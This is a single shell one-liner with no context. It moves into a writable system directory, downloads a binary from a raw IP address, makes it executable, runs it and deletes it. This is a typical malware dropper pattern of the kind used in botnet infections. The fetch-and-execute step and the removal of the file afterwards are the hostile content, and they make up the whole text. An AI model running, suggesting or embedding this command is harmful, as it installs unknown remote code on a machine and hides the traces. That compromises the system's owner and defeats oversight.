cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://66.172.27.232/wget; chmod +x wget; ./wget; rm -rf wget
